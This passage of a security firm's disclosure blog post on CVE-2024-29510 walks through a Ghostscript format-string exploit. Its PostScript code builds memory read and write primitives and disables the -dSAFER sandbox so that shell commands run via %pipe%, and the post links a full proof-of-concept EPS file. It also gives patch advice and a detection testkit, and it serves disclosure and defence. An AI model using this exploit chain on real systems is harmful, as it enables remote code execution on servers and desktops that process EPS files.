&#34;ptrs&#46;ps&#34;&#41; at &#46;&#47;psi&#47;imainarg&#46;c&#58;1050&#10;&#35;19  gs&#95;main&#95;init&#95;with&#95;args01 &#40;minst&#61;0x5555581649b0&#44; argc&#61;0x4&#44; argv&#61;0x7fffffffe228&#41; at &#46;&#47;psi&#47;imainarg&#46;c&#58;242&#10;&#35;20  gs&#95;main&#95;init&#95;with&#95;args &#40;minst&#61;0x5555581649b0&#44; argc&#61;0x4&#44; argv&#61;0x7fffffffe228&#41; at &#46;&#47;psi&#47;imainarg&#46;c&#58;289&#10;&#35;21  psapi&#95;init&#95;with&#95;args &#40;ctx&#61;0x555558164180&#44; argc&#61;0x4&#44; argv&#61;0x7fffffffe228&#41; at &#46;&#47;psi&#47;psapi&#46;c&#58;281&#10;&#35;22  gsapi&#95;init&#95;with&#95;args &#40;instance&#61;0x555558164180&#44; argc&#61;0x4&#44; argv&#61;0x7fffffffe228&#41; at &#46;&#47;psi&#47;iapi&#46;c&#58;253&#10;&#35;23  main &#40;argc&#61;0x4&#44; argv&#61;0x7fffffffe228&#41; at &#46;&#47;psi&#47;gs&#46;c&#58;95
</code></pre>
<p>As you can see, most of the parameter values in this call-stack are pointers, and the few non-pointer values in there are not easily or fully controllable from within Postscript. Sadly, it seems that the same applies for these functions’ local variables: none of them gives us 8 easily controllable sequential bytes.</p>
</div>

    <h2 class="title heading heading--m">
        A ghostly stack buffer    </h2>
<div class="text text-block">
    <p>Luckily, we are not actually limited to the functions of the current call-stack. The stack’s address space is a living region which constantly gets overwritten as the stack grows, shrinks, and grows again. Some function parameters or locals may be uninitialized buffers or padded structs, meaning that they leave previous stack contents in place. Hence, we’re also looking for locals and parameters of functions that <em>at some point</em> happened to be in our accessible region of the stack and have not been overwritten since. </p>
<p>One such variable is the <code>sstate</code> variable in <code>gs_scan_token(...)</code>. This function is invoked as part of the Ghostscript interpreter loop, seemingly when a new token needs to be processed (Postscript is an interpreted language). When this function encounters a percent-sign, it goes into some logic which saves the comment text that follows, just in case it turns out to be a special comment which needs to be processed further.</p>
<div class="aside blue">
Special comments are those that start with <code>%%</code> or <code>%!</code>. These are for example used in EPS file headers to convey metadata:</p>
<pre><code class="language-postscript">
%!PS-Adobe-3.0 EPSF-3.0
%%Document-Fonts: Times-Roman
%%Title: hello.eps
%%Creator: Someone
%%CreationDate: 01-Jan-70
%%Pages: 1
%%BoundingBox:   36   36  576  756
%%LanguageLevel: 1
%%EndComments
%%BeginProlog
%%EndProlog
...
</code></pre>
</div>
<p>Notably, when the comment is the final token in the input stream, the full comment string is <code>memcpy</code>&#8216;d into <code>sstate.s_da.buf</code>, which is a stack-allocated buffer:</p>
<pre><code class="language-c">
      case &#39;&#37;&#39;&#58;&#10;      &#123;                   &#47;&#42; Scan as much as possible within the buffer&#46; &#42;&#47;&#10;          const byte &#42;base &#61; sptr&#59;&#10;          const byte &#42;end&#59;&#10;&#10;          while &#40;&#43;&#43;sptr &#60; endptr&#41;         &#47;&#42; stop 1 char early &#42;&#47;&#10;              switch &#40;&#42;sptr&#41; &#123;&#10;                  case char&#95;CR&#58;&#10;                      end &#61; sptr&#59;&#10;                      if &#40;sptr&#91;1&#93; &#61;&#61; char&#95;EOL&#41;&#10;                          sptr&#43;&#43;&#59;&#10;                    cend&#58; &#47;&#42; Check for externally processed comments&#46; &#42;&#47;&#10;                      retcode &#61; scan&#95;comment&#40;i&#95;ctx&#95;p&#44; myref&#44; &#38;sstate&#44;&#10;                                             base&#44; end&#44; false&#41;&#59;&#10;                      if &#40;retcode &#33;&#61; 0&#41;&#10;                          goto comment&#59;&#10;                      goto top&#59;&#10;                  case char&#95;EOL&#58;&#10;                  case &#39;&#92;f&#39;&#58;&#10;                      end &#61; sptr&#59;&#10;                      goto cend&#59;&#10;              &#125;&#10;          &#47;&#42;&#10;           &#42; We got to the end of the buffer while inside a comment&#46;&#10;           &#42; If there is a possibility that we must pass the comment&#10;           &#42; to an external procedure&#44; move what we have collected&#10;           &#42; so far into a private buffer now&#46;&#10;           &#42;&#47;&#10;          --sptr&#59;&#10;          sstate&#46;s&#95;da&#46;buf&#91;1&#93; &#61; 0&#59;&#10;          &#123;&#10;              &#47;&#42; Could be an externally processable comment&#46; &#42;&#47;&#10;              uint len &#61; sptr &#43; 1 - base&#59;&#10;              if &#40;len &#62; sizeof&#40;sstate&#46;s&#95;da&#46;buf&#41;&#41;&#10;                  len &#61; sizeof&#40;sstate&#46;s&#95;da&#46;buf&#41;&#59;&#10;&#10;              memcpy&#40;sstate&#46;s&#95;da&#46;buf&#44; base&#44; len&#41;&#59;&#10;              daptr &#61; sstate&#46;s&#95;da&#46;buf &#43; len&#59;&#10;          &#125;&#10;          sstate&#46;s&#95;da&#46;base &#61; sstate&#46;s&#95;da&#46;buf&#59;&#10;          sstate&#46;s&#95;da&#46;is&#95;dynamic &#61; false&#59;&#10;      &#125;
</code></pre>
<p>It just happens to be the case that this buffer is not overwritten, and we can see it from our format string if <code>showpage</code> is called right after a special comment. In order for the comment to be the final token in the interpreter’s buffer, we need to invoke the interpreter recursively. This can be done in various ways, but the simplest way is through Ghostscript’s <code>.runstring</code> operator. Think of it like Javascript’s <code>eval</code>.</p>
<p>To demonstrate, we take the example from before, but print many more (about 300) 8-byte words from the stack using <code>%lx</code> (trimmed):</p>
<pre><code class="language-postscript">
...
/upYMoveCommand (1:%lx\n2:%lx\n3:%lx\n ... 298:%lx\n299:%lx\n300:%lx\n)
...
</code></pre>
<p>And we insert the following just before <code>showpage</code>:</p>
<pre><code class="language-postscript">
(%%XXAAAAAAAA) .runstring
</code></pre>
<p>Now, the resulting output looks as follows (trimmed):</p>
<pre><code class="language-plaintext">
...
222:7ffe2ee85dcc
223:7ffe2ee85dcc
224:7ffe2ee85dcc
225:5858252500000000
226:4141414141414141
227:0
228:0
229:0
230:7ffe2ee85e30
231:62bea58b57b0
...
</code></pre>
<p>It seems that <code>sstate.s_da.buf</code> roughly spans stack indices 225 &#8211; 229. The structure’s offsets are such that the start of our comment (<code>"%%XX"</code>) is stored in the word at 225, whereas the word at 226 is the first one we have full control over (<code>"AAAAAAAA"</code>). Hence, we can generalize our code a bit to build a simple primitive that puts an 8-byte string as a single word on the stack (the real stack, not the Postscript stack!):</p>
<pre><code class="language-postscript">
/StackString (AAAAAAAA) def % this can be determined at runtime
(%%XX) StackString cat .runstring
</code></pre>
</div>

    <h2 class="title heading heading--m">
        Putting things together    </h2>
<div class="text text-block">
    <p>Now we can put an arbitrary 8-byte value at a known location on the stack, meaning that we can finally properly use <code>%s</code> and <code>%n</code> to their full potential, giving us memory read and write primitives!</p>
<p>Let&#8217;s abstract away the <code>uniprint</code> format-string invocations and file read into a Postscript procedure called <code>do_uniprint</code>:</p>
<pre><code class="language-postscript">
&#37; &#60;StackString&#62; &#60;FmtString&#62; do&#95;uniprint &#60;LeakedData&#62;&#10;&#47;do&#95;uniprint &#123;&#10;&#9;&#47;FmtString exch def   &#37; the format string payload to use&#10;&#9;&#47;StackString exch def &#37; which 8-byte string to put on the stack beforehand&#10;&#10;&#9;&#37; Select uniprint device with our payload&#10;&#9;&#60;&#60;&#10;&#9;&#9;&#47;OutputFile PathTempFile&#10;&#9;&#9;&#47;OutputDevice &#47;uniprint&#10;&#9;&#9;&#47;upColorModel &#47;DeviceCMYKgenerate&#10;&#9;&#9;&#47;upRendering &#47;FSCMYK32&#10;&#9;&#9;&#47;upOutputFormat &#47;Pcl&#10;&#9;&#9;&#47;upOutputWidth 99999 &#37; This gives a bigger buffer for our format string&#10;&#9;&#9;&#47;upWriteComponentCommands &#123;&#40;x&#41;&#40;x&#41;&#40;x&#41;&#40;x&#41;&#125; &#37; This is required&#44; just put bogus strings&#10;&#9;&#9;&#47;upYMoveCommand FmtString&#10;&#9;&#62;&#62;&#10;&#9;setpagedevice&#10;&#9;&#10;&#9;&#37; Manipulate the interpreter to put controlled data on the stack&#10;&#9;&#40;&#37;&#37;XX&#41; StackString cat &#46;runstring&#10;&#10;&#9;&#37; Produce a page with some content to trigger format string logic&#10;&#9;newpath 1 1 moveto 1 2 lineto 1 setlinewidth stroke&#10;&#9;showpage&#10;&#10;&#9;&#37; Read back the written data&#10;&#9;&#47;InFile PathTempFile &#40;r&#41; file def&#10;&#9;&#47;LeakedData InFile 4096 string readstring pop def&#10;&#9;InFile closefile&#10;&#10;&#9;LeakedData &#37; return&#10;&#125; bind def
</code></pre>
<p>This then allows us to write the higher level procedures <code>write_to</code>, <code>read_ptr_at</code>, <code>read_dereferenced_bytes_at</code>, <code>read_dereferenced_ptr_at</code>:</p>
<pre><code class="language-postscript">
&#37; &#60;StackIdx&#62; &#60;AddrHex&#62; write&#95;to&#10;&#47;write&#95;to &#123;&#10;&#9;&#47;AddrHex exch str&#95;ptr&#95;to&#95;le&#95;bytes def &#37; address to write to&#10;&#9;&#47;StackIdx exch def &#37; stack idx to use&#10;&#10;&#9;&#47;FmtString StackIdx 1 sub &#40;&#37;x&#41; times &#40;&#95;&#37;ln&#41; cat def&#10;&#10;&#9;AddrHex FmtString do&#95;uniprint&#10;&#10;&#9;pop &#37; we don&#39;t care about formatted data&#10;&#125; bind def&#10;&#10;&#37; &#60;StackIdx&#62; read&#95;ptr&#95;at &#60;PtrHexStr&#62;&#10;&#47;read&#95;ptr&#95;at &#123;&#10;&#9;&#47;StackIdx exch def &#37; stack idx to use&#10;&#10;&#9;&#47;FmtString StackIdx 1 sub &#40;&#37;x&#41; times &#40;&#95;&#95;&#37;lx&#95;&#95;&#41; cat def&#10;&#10;&#9;&#40;&#41; FmtString do&#95;uniprint&#10;&#10;&#9;&#40;&#95;&#95;&#41; search pop pop pop &#40;&#95;&#95;&#41; search pop exch pop exch pop&#10;&#125; bind def&#10;&#10;&#37; num&#95;bytes &#60;&#61; 9&#10;&#37; &#60;StackIdx&#62; &#60;PtrHex&#62; &#60;NumBytes&#62; read&#95;dereferenced&#95;bytes&#95;at &#60;ResultAsMultipliedInt&#62;&#10;&#47;read&#95;dereferenced&#95;bytes&#95;at &#123;&#10;&#9;&#47;NumBytes exch def&#10;&#9;&#47;PtrHex exch def&#10;&#9;&#47;PtrOct PtrHex str&#95;ptr&#95;to&#95;le&#95;bytes def &#37; address to read from&#10;&#9;&#47;StackIdx exch def &#37; stack idx to use&#10;&#10;&#9;&#47;FmtString StackIdx 1 sub &#40;&#37;x&#41; times &#40;&#95;&#95;&#37;&#46;&#41; NumBytes 1 string cvs cat &#40;s&#95;&#95;&#41; cat cat def&#10;&#10;&#9;PtrOct FmtString do&#95;uniprint&#10;&#10;&#9;&#47;Data exch &#40;&#95;&#95;&#41; search pop pop pop &#40;&#95;&#95;&#41; search pop exch pop exch pop def&#10;&#10;&#9;&#37; Check if we were able to read all bytes&#10;&#9;Data length NumBytes eq &#123;&#10;&#9;&#9;&#37; Yes we did&#33; So return the integer conversion of the bytes&#10;&#9;&#9;0 &#37; accumulator&#10;&#9;&#9;NumBytes 1 sub -1 0 &#123;&#10;&#9;&#9;&#9;exch &#37; &#60;i&#62; &#60;accum&#62;&#10;&#9;&#9;&#9;256 mul exch &#37; &#60;accum&#42;256&#62; &#60;i&#62;&#10;&#9;&#9;&#9;Data exch get &#37; &#60;accum&#42;256&#62; &#60;Data&#91;i&#93;&#62;&#10;&#9;&#9;&#9;add &#37; &#60;accum&#42;256 &#43; Data&#91;i&#93;&#62;&#10;&#9;&#9;&#125; for&#10;&#9;&#125; &#123;&#10;&#9;&#9;&#37; We did not read all bytes&#44; add a null byte and recurse on addr&#43;1&#10;&#9;&#9;StackIdx 1 PtrHex ptr&#95;add&#95;offset NumBytes 1 sub read&#95;dereferenced&#95;bytes&#95;at&#10;&#9;&#9;256 mul&#10;&#9;&#125; ifelse&#10;&#125; bind def&#10;&#10;&#37; &#60;StackIdx&#62; &#60;AddrHex&#62; read&#95;dereferenced&#95;ptr&#95;at &#60;PtrHexStr&#62;&#10;&#47;read&#95;dereferenced&#95;ptr&#95;at &#123;&#10;&#9;&#37; Read 6 bytes&#10;&#9;6 read&#95;dereferenced&#95;bytes&#95;at&#10;&#10;&#9;&#37; Convert to hex string and return&#10;&#9;16 12 string cvrs&#10;&#125; bind def&#10;
</code></pre>
</div>

    <h2 class="title heading heading--m">
        Exploitation    </h2>
<div class="text text-block">
    <p>Our final exploitation goal is to escape the <code>-dSAFER</code> sandbox, as this would give us full RCE on the machine running Ghostscript. When <code>-dSAFER</code> is enabled, Ghostscript permanently sets a boolean field (<code>path_control_active</code>) in a global context structure to 1. From within Postscript it is normally not possible to change this value back after it’s been set to 1.</p>
<p>However, if we can literally poke into memory at the right location and set this field to 0, all <code>-dSAFER</code> limitations would be gone instantly, for as long as the Ghostscript process runs.</p>
<p>So, we&#8217;d need to find the address of <code>path_control_active</code> (due to ASLR, this changes every time). This field is part of the <code>gs_lib_ctx_core_t</code> structure, a global instance of which is allocated on the heap, but we don&#8217;t know where exactly because it&#8217;s not referred to anywhere on the stack.</p>
<p>Instead, we can use the fact that a pointer to the <code>gs_lib_ctx_core_t</code> structure is part of <code>gs_lib_ctx_t</code>, which is part of <code>gs_memory_t</code>. And as it happens, the function containing the <code>gs_snprintf</code> invocation, <code>upd_wrtrtl(upd_p upd, gp_file *out)</code>, receives a <code>gp_file *</code> parameter <code>out</code> which has a pointer to <code>gs_memory_t</code>. In other words, we just need to grab <code>out</code> from its consistent stack location and then dereference it a bunch of times to get <code>&out->memory->gs_lib_ctx->core->path_control_active</code>.</p>
<p><a href="https://codeanlabs.com/wp-content/uploads/2024/04/mem_layout.drawio.png" target="_blank"><img decoding="async" src="https://codeanlabs.com/wp-content/uploads/2024/04/mem_layout_trans.drawio.png" class="color-invertable"></a></p>
<p>Because none of these fields are at offset 0 in their parent structs, we need to be able to add an offset to a leaked (hex) pointer value, before dereferencing it again. Luckily Postscript is quite flexible in terms of dealing with base-16 numbers, so the following does the trick:</p>
<pre><code class="language-postscript">
&#37; &#60;Offset&#62; &#60;PtrHexStr&#62; ptr&#95;add&#95;offset &#60;PtrHexStr&#62;&#10;&#47;ptr&#95;add&#95;offset &#123;&#10;&#9;&#47;PtrHexStr exch def &#37; hex string pointer&#10;&#9;&#47;Offset exch def &#37; integer to add&#10;&#10;&#9;&#47;PtrNum &#40;16&#35;&#41; PtrHexStr cat cvi def&#10;&#10;&#9;&#37; base 16&#44; string length 12&#10;&#9;PtrNum Offset add 16 12 string cvrs&#10;&#125; bind def
</code></pre>
<p>The result is a hex string, but to get this value onto the stack (remember, using the <code>%%BB........</code> comment) it needs to be a string of raw bytes, and reversed (on little-endian systems at least). Hence, we write another helper function:</p>
<pre><code class="language-postscript">
&#37; Convert hex string &#34;4142DEADBEEF&#34; to padded little-endian byte string &#34;&#92;xEF&#92;xBE&#92;xAD&#92;xDE&#92;x42&#92;x41&#92;x00&#92;x00&#34;&#10;&#37; &#60;HexStr&#62; str&#95;ptr&#95;to&#95;le&#95;bytes &#60;ByteStringLE&#62;&#10;&#47;str&#95;ptr&#95;to&#95;le&#95;bytes &#123;&#10;&#9;&#37; Convert hex string argument to Postscript string&#10;&#9;&#37; using &#60;DEADBEEF&#62; notation&#10;&#9;&#47;ArgBytes exch &#40;&#60;&#41; exch &#40;&#62;&#41; cat cat token pop exch pop def&#10;&#10;&#9;&#37; Prepare resulting string &#40;&#96;string&#96; fills with zeros&#41;&#10;&#9;&#47;Res 8 string def&#10;&#10;&#9;&#37; For every byte in the input&#10;&#9;0 1 ArgBytes length 1 sub &#123;&#10;&#9;&#9;&#47;i exch def&#10;&#10;&#9;&#9;&#37; put byte at index &#40;len&#40;ArgBytes&#41; - 1 - i&#41;&#10;&#9;&#9;Res ArgBytes length 1 sub i sub ArgBytes i get put&#10;&#9;&#125; for&#10;&#10;&#9;Res &#37; return&#10;&#125; bind def
</code></pre>
<p>Don’t worry if this is confusing, it’s just piping to automate the exploit. With all these primitives in place, we can obtain the address of Ghostscript’s <code>path_control_active</code> using a chain of <code>read_dereferenced_ptr_at</code> and <code>ptr_add_offset</code>:</p>
<pre><code class="language-postscript">
&#37; Use primitives to obtain&#58; &#38;out-&#62;memory-&#62;gs&#95;lib&#95;ctx-&#62;core-&#62;path&#95;control&#95;active&#10;&#10;&#47;IdxOutPtr 5 def  &#37; Position of &#96;gp&#95;file &#42;out&#96; on the stack&#10;&#47;PtrOut IdxOutPtr read&#95;ptr&#95;at def&#10;&#10;&#37; &#96;memory&#96; is at offset 144 in &#96;out&#96;&#10;&#47;PtrOutOffset 144 PtrOut ptr&#95;add&#95;offset def&#10;&#47;PtrMem IdxStackControllable PtrOutOffset read&#95;dereferenced&#95;ptr&#95;at def&#10;&#10;&#37; &#96;gs&#95;lib&#95;ctx&#96; is at offset 208 in &#96;memory&#96;&#10;&#47;PtrMemOffset 208 PtrMem ptr&#95;add&#95;offset def&#10;&#47;PtrGsLibCtx IdxStackControllable PtrMemOffset read&#95;dereferenced&#95;ptr&#95;at def&#10;&#10;&#37; &#96;core&#96; is at offset 8 in &#96;gs&#95;lib&#95;ctx&#96;&#10;&#47;PtrGsLibCtxOffset 8 PtrGsLibCtx ptr&#95;add&#95;offset def&#10;&#47;PtrCore IdxStackControllable PtrGsLibCtxOffset read&#95;dereferenced&#95;ptr&#95;at def&#10;&#10;&#37; &#96;path&#95;control&#95;active&#96; is at offset 156 in &#96;core&#96;&#10;&#47;PtrPathControlActive 156 PtrCore ptr&#95;add&#95;offset def
</code></pre>
<p>Now we have the address of <code>path_control_active</code>. The only remaining step is to overwrite it with 0. Using variants of <code>%n</code> it is not possible to write such a low value directly, but we can easily overcome that by instead writing to <code>&path_control_active - 3</code> instead, which on little-endian platforms will overwrite the least-significant byte of the actual field with the most-significant byte of whichever (small) integer we’re writing, hence setting it to zero. We do partially corrupt another value in the struct but it does not seem important. Immediately afterwards the sandbox will be disabled, allowing for the execution of shell commands through <code>%pipe%</code>:</p>
<pre><code class="language-postscript">
&#37; Subtract a bit from the address to make sure we write a null over the field&#10;&#47;PtrTarget -3 PtrPathControlActive ptr&#95;add&#95;offset def&#10;&#10;&#37; And overwrite it&#33;&#10;IdxStackControllable PtrTarget write&#95;to&#10;&#10;&#37; And now path&#95;control&#95;active &#61;&#61; 0&#44; so we can use &#37;pipe&#37; as if -dSAFER was never set &#58;&#41;&#10;&#10;&#40;&#37;pipe&#37;gnome-calculator&#41; &#40;r&#41; file
</code></pre>
<br />
<video controls><source src="https://codeanlabs.com/wp-content/uploads/2024/04/generalized_poc.webm" type="video/webm" /></video><br />

<p>Download the full exploit for Linux (x86-64) <a href="https://codeanlabs.com/wp-content/uploads/2024/06/CVE-2024-29510_poc_calc.eps" target=_"blank">here</a>. Of course you can change the command at the end (<code>gnome-calculator</code>) to your liking.</p>
<p>The exploit code is also a valid EPS file, hence it can be uploaded to image conversion services that accept EPS and invoke Ghostscript. Alternatively we can embed it in a LibreOffice document file, triggering the command execution when the file is opened, either on a server via the headless <code>libreoffice-convert</code>, or on a desktop:</p>
<br />
<video controls><source src="https://codeanlabs.com/wp-content/uploads/2024/04/embedded_in_libreoffice.webm" type="video/webm" /></video><br />

</div>

    <h2 class="title heading heading--m">
        Mitigation    </h2>
<div class="text text-block">
    <div class="aside green">
At Codean Labs we realize it is difficult to keep track of dependencies like this and their associated risks. It is our pleasure to take this burden from you. We perform application security assessments in an efficient, thorough and human manner, allowing you to focus on development. <a href="https://codeanlabs.com/pentest/" target="_blank" rel="noopener">Click here</a> to learn more.
</div>
<p>The best mitigation against this vulnerability is to update your installation of Ghostscript to v10.03.1. If your distribution does not provide the latest Ghostscript version, it might still have released a patch version containing a fix for this vulnerability (e.g., <a href="https://packages.debian.org/search?keywords=ghostscript" target="_blank">Debian</a>, <a href="https://ubuntu.com/security/notices/USN-6835-1" target="_blank">Ubuntu</a>, <a href="https://koji.fedoraproject.org/koji/buildinfo?buildID=2480001" target="_blank">Fedora</a>). It might also be the case that your distribution provides a version so old (< v9.50) that it is not vulnerable to this CVE either.



<p>
If you&#8217;re unsure if you&#8217;re affected, we provide a testkit: a small Postscript file which will tell you if your version of Ghostscript is affected. Download it <a href="https://codeanlabs.com/wp-content/uploads/2024/07/CVE-2024-29510_testkit.ps" target="_blank">here</a>, and run it like this:</p>
<pre><code class="language-plaintext">
ghostscript -q -dNODISPLAY -dBATCH -dSAFER CVE-2024-29510_testkit.ps
</code></pre>
</div>

    <h2 class="title heading heading--m">
        Timeline    </h2>
<div class="text text-block">
    <ul>
<li> 2024-03-14: reported to the Artifex Ghostscript issue tracker</li>
<li> 2024-03-24: CVE-2024-29510 assigned by Mitre</li>
<li> 2024-03-28: issue acknowledged by the developers</li>
<li> 2024-05-02: Ghostscript 10.03.1 released which mitigates the issue</li>
<li> 2024-07-02: publication of this blogpost</li>
</ul>
</div>
    </div>
</div>
<div class="overflow-hidden bg-content-primary py-32 lg:py-64 mt-24">
    <div class="container  flex flex-col lg:flex-row justify-between gap-10">
        <h1 class="text-heading-xxl font-medium text-white">We are here for you</h1>
        <div class="flex justify-center lg:justify-normal items-center gap-2">
            <a
href="https://calendar.google.com/calendar/appointments/schedules/AcZssZ30zahGVLL7gAWd_jNKsOMudLtoZYwzyVQChrc8StEfD-FbT15fNylYv4ybJN3xT_raaEL_n7uE?gv=true"
target="_self"

class="button button-white button-lg"
onclick="/*modal:href*/;return false;">Schedule a meeting</a>
<a href="/cdn-cgi/l/email-protection#c5ada0a9a9aa85a6aaa1a0a4aba9a4a7b6eba6aaa8" target="_self" class="button button-primary button-lg" onclick="Crisp?.chat.show();Crisp?.chat.open();return false;">Contact us</a>
            </div>
    </div>
</div>
    </div> <!-- This is started in the header!  -->
    <footer class="footer flex flex-col gap-10 lg:gap-20 container" data-scroll-section>
        <div class="flex flex-wrap lg:flex-nowrap gap-10 lg:gap-20 justify-between">
    <div class="flex flex-col gap-6 ">
    <h4 class="font-medium text-heading-s">Services</h4>
    <ul class="space-y-4 text-content-neutral/70">
            <li><a
href="https://codeanlabs.com/pricing/"
target="_self"

class="hover:text-content-neutral"
>Pricing</a>
</li>
                <li><a
href="https://codeanlabs.com/services-code-analysis/"
target="_self"

class="hover:text-content-neutral"
>∞ code analysis</a>
</li>
                <li><a
href="https://codeanlabs.com/services-codeless-analysis/"
target="_self"

class="hover:text-content-neutral"
>◦ codeless analysis</a>
</li>
                <li><a
href="https://codeanlabs.com/services-ctf/"
target="_self"

class="hover:text-content-neutral"
>CTF</a>
</li>
            </ul>
</div>
<div class="flex flex-col gap-6 ">
    <h4 class="font-medium text-heading-s">Support</h4>
    <ul class="space-y-4 text-content-neutral/70">
            <li><a href="/cdn-cgi/l/email-protection#186b6d6868776a6c587b777c7d797674797a6b367b7775" target="_self" class="hover:text-content-neutral" onclick="Crisp?.chat.show();Crisp?.chat.open();return false;">Help</a>
</li>
                <li><a
href="http://status.codean.cloud"
target="_blank"

class="hover:text-content-neutral"
>Status</a>
</li>
            </ul>
</div>
<div class="flex flex-col gap-6 ">
    <h4 class="font-medium text-heading-s">Company</h4>
    <ul class="space-y-4 text-content-neutral/70">
            <li><a
href="https://codeanlabs.com/"
target="_self"

class="hover:text-content-neutral"
>Home</a>
</li>
                <li><a
href="https://codeanlabs.com/about/"
target="_self"

class="hover:text-content-neutral"
>About</a>
</li>
                <li><a
href="https://codeanlabs.com/jobs/"
target="_self"

class="hover:text-content-neutral"
>Jobs</a>
</li>
            </ul>
</div>
    </div>
        <div class="border-t-content-neutral/[0.15] border-t">
    <div class="my-10 lg:my-20 grid grid-flow-row auto-rows-max gap-6 justify-center text-center lg:text-start lg:grid-flow-col lg:auto-cols-max lg:justify-between text-base text-content-neutral/70">
                <ul class="space-y-2">
                        <li><a href="https://codeanlabs.com/wp-content/uploads/2023/12/Privacy-statement.pdf" target="_blank" class="hover:text-content-neutral">Privacy statement</a></li>
                    </ul>
                <ul class="space-y-2">
            <li>CoC 82936080 </li>
            <li>VAT NL862661365B01</li>
        </ul>
        <ul class="space-y-2">
            <li><a href="/cdn-cgi/l/email-protection#b9d1dcd5d5d6f9dad6dddcd8d7d5d8dbca97dad6d4" class="hover:text-content-neutral"><span class="__cf_email__" data-cfemail="1179747d7d7e51727e7574707f7d7073623f727e7c">[email&#160;protected]</span></a></li>
            <li><a href="tel:+31 (0)30 899 3984" class="hover:text-content-neutral">+31 (0)30 899 3984</a></li>
        </ul>
        <ul>
            <li>Parijsboulevard 209</li>
            <li>3541 CS Utrecht</li>
            <li>The Netherlands</li>
        </ul>
        <ul class="flex gap-5 items-center justify-center shrink ">
                            <a href="https://twitter.com/codeanio" target="_blank" class="icon:hover:scale-125 icon:fill-content-neutral/70 icon:hover:fill-content-neutral icon:transition-all icon:duration-300" aria-label="Twitter" rel="me">
                    <svg width="24" height="24" viewBox="0 0 24 24"  xmlns="http://www.w3.org/2000/svg">
<g >
<path d="M21.543 7.104C21.558 7.315 21.558 7.527 21.558 7.74C21.558 14.247 16.604 21.75 7.548 21.75V21.747C4.87223 21.7507 2.25194 20.9842 0 19.539C1.28916 19.6943 2.59629 19.594 3.84665 19.2438C5.09702 18.8936 6.26608 18.3004 7.287 17.498C6.25944 17.4785 5.26365 17.1384 4.43888 16.5252C3.61411 15.912 3.0016 15.0564 2.687 14.078C3.42468 14.2202 4.18515 14.1915 4.91 13.994C3.79573 13.7688 2.79367 13.1651 2.07373 12.2853C1.3538 11.4055 0.96031 10.3038 0.96 9.167V9.105C1.64481 9.48663 2.41138 9.6979 3.195 9.721C2.15247 9.02486 1.41442 7.95759 1.1311 6.73643C0.847781 5.51528 1.04049 4.23206 1.67 3.148C2.90661 4.66915 4.44931 5.91321 6.19795 6.79942C7.94659 7.68563 9.86206 8.19416 11.82 8.292C11.5761 7.23682 11.6865 6.13069 12.1342 5.14454C12.5818 4.15839 13.3418 3.34713 14.2967 2.83612C15.2515 2.32512 16.3481 2.14282 17.4169 2.3174C18.4858 2.49198 19.4674 3.01373 20.21 3.802C21.3132 3.58446 22.3711 3.17997 23.338 2.606C22.9705 3.74647 22.2011 4.71455 21.173 5.33C22.1488 5.21444 23.1017 4.9532 24 4.555C23.3388 5.54378 22.5068 6.40692 21.543 7.104Z"/>
</g>

</svg>
                </a>
                                <a href="https://www.linkedin.com/company/codean-labs/" target="_blank" class="icon:hover:scale-125 icon:fill-content-neutral/70 icon:hover:fill-content-neutral icon:transition-all icon:duration-300" aria-label="LinkedIn" rel="me">
                    <svg width="24" height="24" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
<g>
<path d="M20.447 20.452H16.893V14.883C16.893 13.555 16.866 11.846 15.041 11.846C13.188 11.846 12.905 13.291 12.905 14.785V20.452H9.351V9H12.765V10.561H12.811C13.288 9.661 14.448 8.711 16.181 8.711C19.782 8.711 20.448 11.081 20.448 14.166L20.447 20.452ZM5.337 7.433C4.193 7.433 3.274 6.507 3.274 5.368C3.274 4.23 4.194 3.305 5.337 3.305C6.477 3.305 7.401 4.23 7.401 5.368C7.401 6.507 6.476 7.433 5.337 7.433ZM7.119 20.452H3.555V9H7.119V20.452ZM22.225 0H1.771C0.792 0 0 0.774 0 1.729V22.271C0 23.227 0.792 24 1.771 24H22.222C23.2 24 24 23.227 24 22.271V1.729C24 0.774 23.2 0 22.222 0H22.225Z"/>
</g>
</svg>
                </a>
                                <a href="https://infosec.exchange/@Codean" target="_blank" class="icon:hover:scale-125 icon:fill-content-neutral/70 icon:hover:fill-content-neutral icon:transition-all icon:duration-300" aria-label="Mastodon" rel="me">
                    <svg width="24" height="24" viewBox="0 0 24 24"  xmlns="http://www.w3.org/2000/svg">
<g>
<path d="M23.2681 5.313C22.9181 2.735 20.6511 0.703 17.9641 0.309C17.5101 0.242 15.7921 0 11.8131 0H11.7831C7.80309 0 6.94809 0.242 6.49509 0.309C3.88209 0.692 1.49609 2.518 0.917094 5.127C0.640094 6.412 0.610094 7.837 0.661094 9.143C0.735094 11.017 0.749094 12.888 0.921094 14.754C1.03909 15.994 1.24609 17.224 1.54109 18.434C2.09109 20.671 4.31809 22.532 6.50109 23.291C8.83709 24.083 11.3501 24.214 13.7571 23.671C14.0221 23.61 14.2841 23.539 14.5431 23.458C15.1281 23.274 15.8131 23.068 16.3171 22.705C16.3239 22.7 16.3294 22.6935 16.3334 22.6861C16.3374 22.6786 16.3397 22.6704 16.3401 22.662V20.853C16.3401 20.8451 16.3383 20.8373 16.3348 20.8302C16.3314 20.8231 16.3263 20.8169 16.3201 20.812C16.3137 20.8069 16.3062 20.8033 16.2983 20.8016C16.2903 20.7999 16.282 20.8 16.2741 20.802C14.7311 21.1671 13.1507 21.35 11.5651 21.347C8.83509 21.347 8.10209 20.063 7.89109 19.529C7.72226 19.0674 7.615 18.5856 7.57209 18.096C7.57168 18.0877 7.57322 18.0794 7.57658 18.0719C7.57995 18.0643 7.58505 18.0576 7.59147 18.0523C7.59789 18.0471 7.60545 18.0434 7.61355 18.0416C7.62165 18.0398 7.63005 18.04 7.63809 18.042C9.15509 18.405 10.7101 18.588 12.2701 18.588C12.6461 18.588 13.0201 18.588 13.3951 18.578C14.9651 18.534 16.6191 18.454 18.1631 18.156C18.2011 18.148 18.2401 18.141 18.2731 18.132C20.7081 17.668 23.0261 16.212 23.2621 12.528C23.2701 12.383 23.2921 11.008 23.2921 10.858C23.2941 10.346 23.4591 7.228 23.2681 5.313ZM19.5201 14.508H16.9591V8.29C16.9591 6.981 16.4091 6.314 15.2891 6.314C14.0591 6.314 13.4431 7.104 13.4431 8.664V12.067H10.8971V8.663C10.8971 7.103 10.2801 6.313 9.04909 6.313C7.93709 6.313 7.38109 6.981 7.37909 8.29V14.508H4.82209V8.102C4.82209 6.792 5.15909 5.752 5.83309 4.982C6.52909 4.212 7.44109 3.818 8.57309 3.818C9.88409 3.818 10.8751 